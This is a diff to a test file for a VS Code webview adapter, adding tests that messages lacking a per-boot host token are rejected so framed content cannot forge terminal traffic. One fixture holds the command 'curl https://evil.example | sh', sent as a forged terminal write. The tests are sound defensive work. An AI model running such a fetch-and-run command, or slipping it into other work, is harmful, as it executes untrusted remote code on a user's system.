@@ -27,7 +27,22 @@ import {
   collectTerminalSemanticEvents,
   TerminalProtocolParser,
 } from '../terminal-protocol';
+import { HOST_MESSAGE_TOKEN_FIELD, HOST_MESSAGE_TOKEN_GLOBAL } from '../vscode-message-token';
 import { VSCodeAdapter } from './vscode-adapter';
+
+/** Stand-in for the per-boot token the extension host injects at webview boot. */
+const HOST_TOKEN = 'test-host-message-token';
+
+/**
+ * Build the `message` event the extension host would post: the payload plus the
+ * token stamp `serveWebview`'s channel adds. Framed content can't read the
+ * token, so a forged message is just this without the stamp.
+ */
+function hostMessage(data: Record<string, unknown>, token: unknown = HOST_TOKEN): MessageEvent {
+  return new MessageEvent('message', {
+    data: { ...data, [HOST_MESSAGE_TOKEN_FIELD]: token },
+  });
+}
 
 describe('VSCodeAdapter PTY exit handling', () => {
   let windowTarget: EventTarget;
@@ -50,6 +65,9 @@ describe('VSCodeAdapter PTY exit handling', () => {
     }
     vi.stubGlobal('window', windowTarget);
     vi.stubGlobal('CustomEvent', TestCustomEvent);
+    // The adapter captures this at construction, so it must be stubbed before
+    // any `new VSCodeAdapter()` below.
+    vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, HOST_TOKEN);
     vi.stubGlobal('acquireVsCodeApi', () => ({
       postMessage,
       getState: vi.fn(),
@@ -67,9 +85,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
     const exits: Array<{ id: string; exitCode: number }> = [];
     adapter.onPtyExit((detail) => exits.push(detail));
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: { type: 'pty:exit', id: 'pane-1', exitCode: 7 },
-    }));
+    windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));
 
     expect(exits).toEqual([{ id: 'pane-1', exitCode: 7 }]);
     expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
@@ -129,17 +145,42 @@ describe('VSCodeAdapter PTY exit handling', () => {
     });
   });
 
+  it('sends watched-command initialization and mutations as distinct messages', () => {
+    const adapter = new VSCodeAdapter();
+
+    adapter.alertSetWatchedCommands(['claude']);
+    adapter.alertSetCommandWatched('npm', true);
+
+    expect(postMessage).toHaveBeenCalledWith({
+      type: 'alert:initializeWatchedCommands',
+      names: ['claude'],
+    });
+    expect(postMessage).toHaveBeenCalledWith({
+      type: 'alert:setCommandWatched',
+      name: 'npm',
+      watched: true,
+    });
+  });
+
+  it('forwards the host canonical watched-command snapshot', () => {
+    const adapter = new VSCodeAdapter();
+    const snapshots: string[][] = [];
+    adapter.onWatchedCommands((names) => snapshots.push(names));
+
+    windowTarget.dispatchEvent(hostMessage({ type: 'alert:watchedCommands', names: ['claude', 'npm'] }));
+
+    expect(snapshots).toEqual([['claude', 'npm']]);
+  });
+
   it('parses replay buffers into semantic events and strips OSCs before forwarding', () => {
     const adapter = new VSCodeAdapter();
     const replays: Array<{ id: string; data: string }> = [];
     adapter.onPtyReplay((detail) => replays.push(detail));
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: {
-        type: 'pty:replay',
-        id: 'pane-1',
-        data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
-      },
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'pty:replay',
+      id: 'pane-1',
+      data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
     }));
 
     // Visible data is stripped of the OSC 7 sequence.
@@ -163,9 +204,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
       { type: 'promptStart' as const },
     ];
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: { type: 'terminal:semanticEvents', id: 'pane-1', events },
-    }));
+    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:semanticEvents', id: 'pane-1', events }));
     void adapter;
 
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledTimes(1);
@@ -194,7 +233,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
     }));
 
     new VSCodeAdapter();
-    windowTarget.dispatchEvent(new MessageEvent('message', { data: wirePayload }));
+    windowTarget.dispatchEvent(hostMessage(wirePayload));
 
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledTimes(1);
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledWith('pane-1', hostEvents);
@@ -207,15 +246,13 @@ describe('VSCodeAdapter PTY exit handling', () => {
     });
 
     new VSCodeAdapter();
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: {
-        type: 'dormouse:newTerminal',
-        shell: '/bin/zsh',
-        args: ['-l'],
-        name: 'zsh',
-        replaceUntouched: true,
-        announce: true,
-      },
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'dormouse:newTerminal',
+      shell: '/bin/zsh',
+      args: ['-l'],
+      name: 'zsh',
+      replaceUntouched: true,
+      announce: true,
     }));
 
     expect(requests).toEqual([{
@@ -225,5 +262,118 @@ describe('VSCodeAdapter PTY exit handling', () => {
       replaceUntouched: true,
       announce: true,
     }]);
+  });
+
+  // "Arrived as a message event" is not evidence the extension host sent it.
+  // See ../vscode-message-token.ts.
+  describe('host message authentication', () => {
+    /** What framed content can produce: the right shape, no token. */
+    function forgedMessage(data: Record<string, unknown>): MessageEvent {
+      return new MessageEvent('message', { data });
+    }
+
+    const controlRequest = {
+      type: 'dor:controlRequest',
+      requestId: 'forged-1',
+      surfaceId: 'pane-1',
+      method: 'surface.send',
+      params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
+    };
+
+    it('ignores a control request that does not carry the host token', () => {
+      const dispatched: unknown[] = [];
+      windowTarget.addEventListener('dormouse:control-request', (event) => {
+        dispatched.push((event as CustomEvent).detail);
+      });
+
+      new VSCodeAdapter();
+      windowTarget.dispatchEvent(forgedMessage(controlRequest));
+
+      // No control request reaches use-dor-control, so nothing becomes a PTY
+      // write, and nothing is echoed back to the host.
+      expect(dispatched).toEqual([]);
+      expect(postMessage).not.toHaveBeenCalled();
+    });
+
+    it('processes the same control request when it carries the host token', () => {
+      const dispatched: Array<{ method: string; params: unknown }> = [];
+      windowTarget.addEventListener('dormouse:control-request', (event) => {
+        dispatched.push((event as CustomEvent).detail);
+      });
+
+      new VSCodeAdapter();
+      windowTarget.dispatchEvent(hostMessage(controlRequest));
+
+      expect(dispatched).toHaveLength(1);
+      expect(dispatched[0]).toMatchObject({
+        method: 'surface.send',
+        params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
+      });
+    });
+
+    it('ignores untokened pty traffic, so framed content cannot spoof terminal state', () => {
+      const adapter = new VSCodeAdapter();
+      const data: unknown[] = [];
+      const replays: unknown[] = [];
+      const exits: unknown[] = [];
+      const lists: unknown[] = [];
+      adapter.onPtyData((detail) => data.push(detail));
+      adapter.onPtyReplay((detail) => replays.push(detail));
+      adapter.onPtyExit((detail) => exits.push(detail));
+      adapter.onPtyList((detail) => lists.push(detail));
+
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:data', id: 'pane-1', data: 'fake' }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:replay', id: 'pane-1', data: 'fake' }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 0 }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:list', ptys: [] }));
+      windowTarget.dispatchEvent(forgedMessage({
+        type: 'terminal:semanticEvents', id: 'pane-1', events: [{ type: 'promptStart' }],
+      }));
+
+      expect(data).toEqual([]);
+      expect(replays).toEqual([]);
+      expect(exits).toEqual([]);
+      expect(lists).toEqual([]);
+      expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).not.toHaveBeenCalled();
+    });
+
+    it('rejects a wrong token as firmly as a missing one', () => {
+      const adapter = new VSCodeAdapter();
+      const exits: unknown[] = [];
+      adapter.onPtyExit((detail) => exits.push(detail));
+
+      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }, 'guessed'));
+
+      expect(exits).toEqual([]);
+    });
+
+    it('guards request/response replies too, so a forged reply cannot beat the real one', async () => {
+      const adapter = new VSCodeAdapter();
+      const pending = adapter.getCwd('pane-1');
+
+      const [request] = postMessage.mock.calls[0] as [{ requestId: string }];
+
+      // A forged reply matching type and requestId, racing ahead of the host's.
+      windowTarget.dispatchEvent(forgedMessage({
+        type: 'pty:cwd', id: 'pane-1', cwd: '/attacker', requestId: request.requestId,
+      }));
+      windowTarget.dispatchEvent(hostMessage({
+        type: 'pty:cwd', id: 'pane-1', cwd: '/real/project', requestId: request.requestId,
+      }));
+
+      expect(await pending).toBe('/real/project');
+    });
+
+    it('accepts nothing when the host injected no token', () => {
+      // A webview served without the global fails closed rather than open.
+      vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, undefined);
+      const adapter = new VSCodeAdapter();
+      const exits: unknown[] = [];
+      adapter.onPtyExit((detail) => exits.push(detail));
+
+      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));
+
+      expect(exits).toEqual([]);
+    });
   });
 });
